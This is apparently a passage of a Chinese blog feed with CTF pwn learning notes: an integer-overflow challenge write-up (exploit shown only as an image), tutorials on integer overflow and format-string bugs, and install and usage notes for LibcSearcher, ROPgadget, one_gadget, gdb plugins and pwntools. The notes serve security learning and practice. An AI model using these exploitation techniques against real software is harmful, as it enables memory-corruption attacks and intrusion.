<h3 id="八、string"><a href="#八、string" class="headerlink" title="八、string"></a>八、string</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是</p>
<h3 id="九、int-overflow"><a href="#九、int-overflow" class="headerlink" title="九、int_overflow"></a>九、int_overflow</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是32位的<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326211227.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326211618-1616764664538.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326211724.png"></p>
<p>首先v4只能等于1进入login，后面的函数也能发现，全都够不到返回地址，所以无法进行溢出，继续往后面看，</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326212348.png"></p>
<p>认真审计这页代码，发现v3必须要在4-7之间，然后才能到strcpy函数那里，而那里dest的地址距离返回地址可是十分近的，那么利用点是否可能在s上面？接着看v3竟然是无符号的8位整型数， 似乎可以利用整数溢出，而让v3截断在4-7之间，实际s里面的字符却远远不止这么一点，而s就是上一页的char，是可以随意输入的。exp如下：</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326212348-1616765685730.png"></p>
]]></content>
  </entry>
  <entry>
    <title>整数溢出</title>
    <url>/2020/12/10/2020-12-10-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<p>数据类型以及所取的范围（来自ctf-wiki，之后的内容也是参照了许多的wiki，以及一些来自别处的零碎,环境为64位下使用gcc-5.4）</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">字节</th>
<th align="center">范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~32767(0~0x7fff) <br> -32768~-1(0x8000~0xffff)</td>
</tr>
<tr>
<td align="center">unsigned short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~65535(0~0xffff)</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~2147483647(0~0x7fffffff) <br> -2147483648~-1(0x80000000~0xffffffff)</td>
</tr>
<tr>
<td align="center">unsigned int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~4294967295(0~0xffffffff)</td>
</tr>
<tr>
<td align="center">long int</td>
<td align="center">8byte(qword)</td>
<td align="center">正: 0~0x7fffffffffffffff<br>负:0x8000000000000000~0xffffffffffffffff</td>
</tr>
<tr>
<td align="center">unsigned long int</td>
<td align="center">8byte(qword)</td>
<td align="center">0~0xffffffffffffffff</td>
</tr>
</tbody></table>
<p>那么，所谓的整数溢出，就是指程序中变量所取数据超过了其数据类型的范围而造成的溢出现象。</p>
<p>整数溢出一共分为三种类型：</p>
<ul>
<li>有符号数溢出</li>
<li>无符号数溢出</li>
<li>高位数传低位数的截断</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm"># 伪代码<br>short <span class="hljs-keyword">int</span> a<span class="hljs-comment">;</span><br><br>a = a + <span class="hljs-number">1</span><span class="hljs-comment">;</span><br># 对应的汇编<br><span class="hljs-keyword">movzx</span>  <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x1c</span>]<br><span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x1c</span>], <span class="hljs-built_in">ax</span><br><br>unsigned short <span class="hljs-keyword">int</span> b<span class="hljs-comment">;</span><br><br>b = b + <span class="hljs-number">1</span><span class="hljs-comment">;</span><br># assembly code<br><span class="hljs-keyword">add</span>    <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x1a</span>], <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>以上为无符号数和有符号数进行+1操作的汇编指令，可以看出，有符号数的运算是在寄存器中进行运算的，而无符号数是直接在内存中进行运算的</p>
<h1 id="有符号数溢出"><a href="#有符号数溢出" class="headerlink" title="有符号数溢出"></a>有符号数溢出</h1><p>以下均假设 short int a;</p>
<h3 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h3><p>short的范围在0~0x7fff和负数0x8000~0xffff</p>
<p>假设取最大值0x7fff(32767)把它进行加1的运算，变为0x8000，就会发现：0x8000在有符号数中是-32768，实现了从一个正数变为了负数，用十进制来表示就是<strong>32767+1==-32768</strong> </p>
<h3 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h3><p>假设取最小值0x8000进行减1运算，得到结果为0x7fff，这在有符号数中是正数32767。</p>
<p>即：**-32768-1==32767**</p>
<h2 id="无符号数溢出"><a href="#无符号数溢出" class="headerlink" title="无符号数溢出"></a>无符号数溢出</h2><p>以下均假设 unsigned short int </p>
<h3 id="上界溢出-1"><a href="#上界溢出-1" class="headerlink" title="上界溢出"></a>上界溢出</h3><p>unsigned short的范围是在0~0xffff</p>
<p>假设取最大值0xffff进行加1运算，虽然结果本应该是0x10000，但是由于只能存储两个字节的原因，会进行截断，只能取到0x0000。这个过程用十进制来表示就是<strong>65535+1==0</strong></p>
<h3 id="下界溢出-1"><a href="#下界溢出-1" class="headerlink" title="下界溢出"></a>下界溢出</h3><p>假设取最小值0x0000进行减1运算，因为无符号数不存在负数，那么得到的结果0xffff不会进行负数的补码还原得到-1，而是按照整数得到65535，即<strong>0-1==65535</strong></p>
<p>以上，两种的上下界溢出的道理是一致的，都是因为计算机底层指令是不区分有符号和无符号的，数据都是以二进制形式存在而在编译器的层面才对有符号和无符号进行区分，产生不同的汇编指令。正前后的不一致，造成了漏洞的出现</p>
<h2 id="高位数传低位数的截断"><a href="#高位数传低位数的截断" class="headerlink" title="高位数传低位数的截断"></a>高位数传低位数的截断</h2><p>这种其实最好理解，就是因为数据类型的位数不够，而不能取得完全值，只能取到与自身位数相等的数值，而造成数据的截断</p>
<ul>
<li>加法截断： </li>
</ul>
<figure class="highlight excel"><table><tr><td class="code"><pre><code class="hljs excel"><span class="hljs-number">0</span>xffffffff + <span class="hljs-number">0</span>x00000001 <br><br>= <span class="hljs-number">0</span>x0000000100000000 (long <span class="hljs-built_in">int</span>) <br><br>= <span class="hljs-number">0</span>x00000000 (<span class="hljs-built_in">int</span>) <br></code></pre></td></tr></table></figure>

<ul>
<li>乘法截断</li>
</ul>
<figure class="highlight excel"><table><tr><td class="code"><pre><code class="hljs excel"><span class="hljs-number">0</span>x00123456 * <span class="hljs-number">0</span>x00654321 <br>= <span class="hljs-number">0</span>x000007336BF94116 (long <span class="hljs-built_in">int</span>) <br>= <span class="hljs-number">0</span>x6BF94116 (<span class="hljs-built_in">int</span>)<br></code></pre></td></tr></table></figure>

<p>整数溢出就大致到此了，但是如何利用它造成危害呢？一般都是利用整数溢出和其他的漏洞进行搭配而造成危害。</p>
<p>以下有两个函数，常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p>
<ul>
<li>memcpy()函数原型为void *memcpy(void *dest, const void *src, size_t n); 功能是将 src 所指向的字符串的前 n 个字符复制到 dest 所指的数组中，并返回 dest。</li>
<li>strncpy()函数原型为char *strncpy(char *dest, const char *src, size_t n)；功能是从源 src 所指的内存地址的起始位置开始复制 n 个字节到目标 dest 所指的内存地址的起始位置中。并不会自动添加’\0’字符。 </li>
</ul>
<p>这两个函数的n都是无符号数，如果用一个负数去填充，就可能变成一个很大的数。从而复制大量内容到缓冲区中，造成溢出</p>
<p>其他的就靠做题与实战去提升巩固了</p>
]]></content>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="前提知识储备："><a href="#前提知识储备：" class="headerlink" title="前提知识储备："></a>前提知识储备：</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>格式化字符串函数可以接受<strong>可变数量</strong>的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
<ul>
<li>格式化字符串函数</li>
<li>格式化字符串</li>
<li>后续参数，就是下图中逗号后的变量（可以不要）</li>
</ul>
<p>上述可转为该图：</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf.png"></p>
<p>将相关正式概念代入图片更好理解</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>输入：</p>
<ul>
<li>scanf</li>
</ul>
<p>输出函数</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">基本介绍</th>
</tr>
</thead>
<tbody><tr>
<td align="center">printf</td>
<td align="center">输出到stdout</td>
</tr>
<tr>
<td align="center">fprintf</td>
<td align="center">输出到指定FILE流</td>
</tr>
<tr>
<td align="center">vprintf</td>
<td align="center">根据参数列表格式化输出到 stdout</td>
</tr>
<tr>
<td align="center">vfprintf</td>
<td align="center">根据参数列表格式化输出到指定FILE流</td>
</tr>
<tr>
<td align="center">sprintf</td>
<td align="center">输出到字符串</td>
</tr>
<tr>
<td align="center">snprintf</td>
<td align="center">输出指定字节数到字符串</td>
</tr>
<tr>
<td align="center">vsprintf</td>
<td align="center">根据参数列表格式化输出到字符串</td>
</tr>
<tr>
<td align="center">vsnprintf</td>
<td align="center">根据参数列表格式化输出指定字节到字符串</td>
</tr>
<tr>
<td align="center">setproctitle</td>
<td align="center">设置argv</td>
</tr>
<tr>
<td align="center">syslog</td>
<td align="center">输出日志</td>
</tr>
<tr>
<td align="center">err, verr, warn, vwarn等</td>
<td align="center">。。。</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><p>printf函数的字符串漏洞</p>
<p>此漏洞如（来自攻防世界的CGfsb）：</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/QQ%E5%9B%BE%E7%89%8720201205111442-1607139495232.png"></p>
</li>
</ul>
<p>在格式化字符串函数中%n，作用是把在%n前输出的字符个数赋值给对应的整型指针参数所指的变量</p>
<p>%hh的作用是限定输出格式为8位，即一个字节；</p>
<p>%h的作用是限定输出格式为16位，即两个字节；</p>
<p>%l的作用是限定输出格式为32位，即四个字节；</p>
<p>%ll的作用是限定输出格式为64位，即八个字节；</p>
<p>%L的作用是输出实数，支持long double类型；</p>
<ul>
<li><p>sprintf原型int sprintf(char *string, char *format [,argument,…])</p>
<ul>
<li><p><strong>string</strong>– 这是指向一个字符数组的指针，该数组存储了 C 字符串。</p>
</li>
<li><p><strong>format</strong>– 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是**%[flags] (width)[.precision] (length)specifier**</p>
</li>
<li><p>**[argument]…**：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</p>
</li>
</ul>
</li>
</ul>
<p>把格式化的数据写入某个字符串缓冲区。如果成功，则返回写入的字符总数（不包括’\0’），不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="x86系统下："><a href="#x86系统下：" class="headerlink" title="x86系统下："></a>x86系统下：</h3><p>以printf为例</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf-1608199588168.png"></p>
<p>假设printf函数将以图中方式进行输出。那么作为一个函数，首先就是将参数入栈，又按照从右到左的方式。那么将按以下的情况入栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">3.14<br>123456<br>addr of &quot;red&quot;<br>addr of format string: Color %s，Number %d，Float %4.2f<br></code></pre></td></tr></table></figure>

<p>执行printf函数后，函数会获取第一个参数，也就是格式化字符串。函数将会一个个的读取字符串中的字符，有以下情况：</p>
<ul>
<li>当前字符不是%，直接输出到相应标准输出。</li>
<li>当前字符是%， 继续读取下一个字符<ul>
<li>如果没有字符，报错</li>
<li>如果下一个字符是%,输出%；否则根据相应字符对应的数据类型，获取相应的参数，将其输出</li>
</ul>
</li>
</ul>
<p>那么漏洞将会发生在哪呢？</p>
<p>假设我们将程序写成这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>我们并没有提供printf函数中%后对应的参数，此时程序并不会报错停止，而是继续执行，会在栈中存储着格式化字符串地址上面的三个高地址变量解析，作为输出：</p>
<ul>
<li><p>%s则解析其地址对应的字符串</p>
</li>
<li><p>%d解析内容对应的整型值</p>
</li>
<li><p>%f解析内容对应的浮点值</p>
<p>第一个，注意！解析地址！如果是一个无法访问的地址比如0，那么程序将崩溃，这也是我们利用的点，比如注入不限量个%s，总有一个能让程序崩溃的。而其余两个我们也可以借此而使得栈上的内容泄露出来</p>
<p>这里补充一点：我们是可以获取栈中被视为第n+1个参数的值方法为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">%n$p<br></code></pre></td></tr></table></figure>

<p>n代表该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。</p>
<h3 id="x64系统下："><a href="#x64系统下：" class="headerlink" title="x64系统下："></a>x64系统下：</h3><p>原理与x86并无不同，唯一需要注意的就是x64系统下，函数的前六位参数是使用寄存器存放的，顺序为RDI,RSI,RDX,RCX,R8,R9对应前六位参数，所以在gdb中相对偏移时，要把栈上的偏移加上相差寄存器的数量的才是n的值</p>
</li>
</ul>
<p>参考：</p>
<p>ctf-wiki格式化字符串漏洞</p>
]]></content>
  </entry>
  <entry>
    <title>pwn工具的安装及使用指令</title>
    <url>/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><p>1、安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs linux">git clone https://github.com/lieanu/LibcSearcher.git<br>cd LibcSearcher<br>python setup.py develop<br></code></pre></td></tr></table></figure>

<p>2、错误：</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2020101521162965.png"></p>
<p>处理办法：</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/20201015211718534.png"></p>
<p>3、常见用法（脚本中使用）</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr（指的是got表地址）)<br>libc_base=puts_addr-libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libc_base+libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr=libc_base+libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>以上内容转载<a href="https://blog.csdn.net/yongbaoii/article/details/109105721">LibcSearcher 安装 错误处理 与使用</a></p>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>一般用在64位下，因为64位的函数传参与32位有些不同，需使用到寄存器传参，常用命令格式：</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>  或者 <span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>| <span class="hljs-string">grep</span> <span class="hljs-string">&#x27;eax&#x27;</span> <br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;leave|ret&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;call|rax&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;sh&#x27;</span>（有的时候是找<span class="hljs-string">sh</span>，这个也可以成为参数）<br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;int&#x27;</span>  （寻找<span class="hljs-string">int</span> <span class="hljs-string">80H</span>系统中断指令）<br></code></pre></td></tr></table></figure>

<p>文件也可以是libc</p>
<p>附：</p>
<p>搭配使用one_gadget</p>
<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs linux">sudo apt -y install ruby<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure>

<p>one_gadget是用来去查找动态链接库里execve(“/bin/sh”, rsp+0x70, environ)函数的地址的</p>
<p>使用方法：</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2020101517362410.png"></p>
<p>但是这样只会给出常见的容易满足的one_gadget，通过下面指令可以查询到一些比较难满足的one_gadget</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">one_gadget libc-<span class="hljs-number">2.27</span>.so <span class="hljs-comment">--l 2</span><br>或者 one_gadget libc-<span class="hljs-number">2.27</span>.so <span class="hljs-comment">--level 2</span><br></code></pre></td></tr></table></figure>

<p>来源： <a href="https://blog.csdn.net/yongbaoii/article/details/109101822">https://blog.csdn.net/yongbaoii/article/details/109101822</a> </p>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先装，因为这个带有parseheap、以及heapinfo等指令，有的场景下更好用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd ~/<br>git clone https://github.com/scwuaptx/Pwngdb.git <br>cp ~/Pwngdb/.gdbinit ~/<br></code></pre></td></tr></table></figure>

<p>pwndbg：pwndbg (/poʊnddb æg/)是一个GDB插件，使GDB的调试不那么糟糕，重点关注低级软件开发人员、硬件黑客、逆向工程师和开发人员需要的特性</p>
<p>peda：GDB的Python开发开发协助</p>
<p>gef：GEF(发音为ʤɛf -“Jeff”)是一组用于x86/64、ARM、MIPS、PowerPC和SPARC的命令，用于在使用老式GDB时帮助开发人员和反向工程师</p>
<p>把这三个都先下载下来：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/longld/peda.git<br>git clone https://github.com/pwndbg/pwndbg.git<br>git clone https://github.com/hugsy/gef.git<br></code></pre></td></tr></table></figure>

<p>pwndbg安装：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure>

<p>安装插件依赖：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">sudo pip install keystone-engine ropper keystone-engine<br></code></pre></td></tr></table></figure>

<p>更换gdb指令，在gef、pwndbg、peda中选择，选哪个就把其他都注释掉</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo vim ~/.gdbinit<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># vim后在文件内输入下方横线中内容，选择三个插件其中一个，另外两个注释掉，保存退出</span></span><br>-------------------------------------------------------------------------<br>source /home/hollk/tools/pwndbg/gdbinit.py <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">source</span> /home/hollk/tools/peda/peda.py</span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">source</span> /home/hollk/tools/gef-dev/gef.py</span><br>-------------------------------------------------------------------------<br></code></pre></td></tr></table></figure>

<h3 id="1-用途"><a href="#1-用途" class="headerlink" title="1. 用途"></a>1. 用途</h3><p>启动你的程序，可以按照你的自定义的要求随心所欲的运行程序</p>
<p>可让被调试的程序在你所指定的调置的断点处停住。（断点可以是条件表达式）</p>
<p>当程序被停住时，可以检查此时你的程序中所发生的事。</p>
<p>动态的改变你程序的执行环境</p>
<p>使用前要：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">gcc -<span class="hljs-keyword">g</span> <span class="hljs-keyword">test</span>.c -o <span class="hljs-keyword">test</span><br><span class="hljs-comment">//gcc中-g选项是为了获得有关调试信息，要用gdb进行调试，必须使用-g生成二进制可执行文件</span><br></code></pre></td></tr></table></figure>

<h3 id="2-常用指令："><a href="#2-常用指令：" class="headerlink" title="2. 常用指令："></a>2. 常用指令：</h3><ul>
<li><p>checksec 查看elf编译的保护选项</p>
</li>
<li><p>aslr 查看gdb的aslr设置 aslr on 可开启alsr设置</p>
</li>
<li><p>file 文件名 加载objfile </p>
</li>
<li><p>disas addr 对地址addr处的指令进行反汇编，addr可以是函数名（但是不加* 使用函数名就无法用于参数确认；不加*，断点就不会设置到汇编语言层级的函数开头）</p>
</li>
<li><p>b *addr 在addr处下一个断点   b后跟函数名就不用 *</p>
</li>
<li><p>enable 激活断点</p>
</li>
<li><p>disable 禁用断点</p>
</li>
<li><p>info b 查看断点</p>
</li>
<li><p>del num 删除断点</p>
</li>
<li><p>x addr 查看addr处存储的数据值 </p>
</li>
<li><p>x/wx $esp 　　以4字节16进制显示栈中内容</p>
</li>
<li><p>stack 100　　 插件提供，显示栈中100项</p>
</li>
<li><p>find xxx　　 快速查找，很实用</p>
</li>
<li><p>r 运行被调试的程序 </p>
</li>
<li><p>c 继续运行 </p>
</li>
<li><p>ni 单步执行不进入函数调用</p>
</li>
<li><p>si 单步执行并进入函数调用</p>
</li>
<li><p>elfsymbol – 获取non-debugging symbol信息（plt表）</p>
</li>
<li><p>parseheap 可以对heap进行分析，得到相关信息</p>
</li>
<li><p>dumprop –在给定内存范围中Dump出所有ROP gadgets </p>
</li>
<li><p>vmmap 得到虚拟映射地址，同时可查看执行权限</p>
</li>
<li><p>heapinfo 查看bin链信息</p>
</li>
<li><p>heapbase 查看堆地址</p>
</li>
<li><p>finish 执行到函数返回</p>
</li>
<li><p>arena 查看mainarena</p>
</li>
<li><p>telescope 地址    可以查看一小段该地址的内容</p>
</li>
<li><p>dumpargs– 函数将要被调用时，显示将要被传入函数的所有参数</p>
</li>
<li><p>readelf – 获取elf头信息 </p>
</li>
<li><p>x/&lt;n/f/u&gt;其中n、f、u是可选的参数</p>
<p>x/s 地址　　查看字符串</p>
<p>x/wx 地址　　查看DWORD</p>
<p>x/c 地址　　单字节查看</p>
<p>x/16x $esp+0x12 查看寄存器偏移（16代表查看16个）</p>
<p>set args 可指定运行时参数。（如：set args 10 20 30 40 50）</p>
<p>show args 命令可以查看设置好的运行参数。</p>
</li>
</ul>
<p>s 按字符串输出</p>
<p>x 按十六进制格式显示变量。</p>
<p>d 按十进制格式显示变量。</p>
<p>u 按十六进制格式显示无符号整型。</p>
<p>o 按八进制格式显示变量。</p>
<p>t 按二进制格式显示变量。</p>
<p>a 按十六进制格式显示变量。</p>
<p>c 按字符格式显示变量。</p>
<p>f 按浮点数格式显示变量。</p>
<h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><ul>
<li><p>s step，si步入</p>
</li>
<li><p>n 执行下一条指令 一般装了pwndbg之后下一行指的是下一条汇编，但是如果调试的程序是带调试信息的，一般会跳几行汇编，ni步入，这个就是真正的下一条汇编指令</p>
</li>
<li><p>b 在某处下断点，可以用</p>
</li>
<li><ul>
<li>b * adrress</li>
<li>b function_name</li>
<li>info b 查看断点信息</li>
<li>delete 1 删除第一个断点</li>
</ul>
</li>
<li><p>c 继续</p>
</li>
<li><p>r 执行</p>
</li>
<li><p><strong>disas addr 查看addr处前后的反汇编代码</strong></p>
</li>
<li><p>readelf 文件信息</p>
</li>
</ul>
<p>一般c,n,ni后面都可以跟数字，</p>
<p>ni 10</p>
<p>就代表下10行指令</p>
<p>###显示数据</p>
<h4 id="p"><a href="#p" class="headerlink" title="p"></a>p</h4><ul>
<li>p function 显示某个函数地址</li>
<li>p $esp 某个寄存器的值</li>
<li><strong>p 0xdd-0x55 可以当计算器（常用，不用另外开python了）</strong></li>
<li><strong>p &amp;VarName 查看变量地址（貌似蛮有用的）</strong></li>
<li>p * 0xffffebac 查看某个地址处的值</li>
</ul>
<h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><ul>
<li>x/10wx addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
<li>x/40gx addr 跟上面一样，一般上面32位用，这个64位</li>
<li>x/10s addr 查看addr开始的10个字符串</li>
<li>x/x $esp 查看esp寄存器中的值</li>
<li>x/b addr 查看addr处的字符</li>
<li><strong>x/10i addr 查看addr处的反汇编结果（addr可以为函数）（常用）</strong></li>
</ul>
<h4 id="info-i"><a href="#info-i" class="headerlink" title="info(i)"></a>info(i)</h4><ul>
<li><strong>info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp)</strong></li>
<li>i r eflags 查看状态寄存器</li>
<li>i r ss 查看段寄存器</li>
<li>i b 查看断点信息</li>
<li>i functions 查看所有的函数</li>
</ul>
<h4 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h4><ul>
<li><strong>find 查找字符串 peda带有（常用）</strong></li>
<li>searchmem 查找字符串 peda带有</li>
<li>ropsearch “xor eax,eax;ret” 0x08048080 0x08050000 查找某段的rop peda带有</li>
<li>ropgadget 提供多个pop|ret可行结果 peda带有</li>
</ul>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="1-context设置"><a href="#1-context设置" class="headerlink" title="1. context设置"></a>1. context设置</h3><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p>
<p>一般来说我们设置context只需要简单的一句话:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>这句话的意思是： </p>
<ol>
<li>os（operating system 操作系统）设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li>
<li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li>
<li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li>
</ol>
<h3 id="2-Cyclic-Pattern"><a href="#2-Cyclic-Pattern" class="headerlink" title="2. Cyclic Pattern"></a>2. Cyclic Pattern</h3><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置。</p>
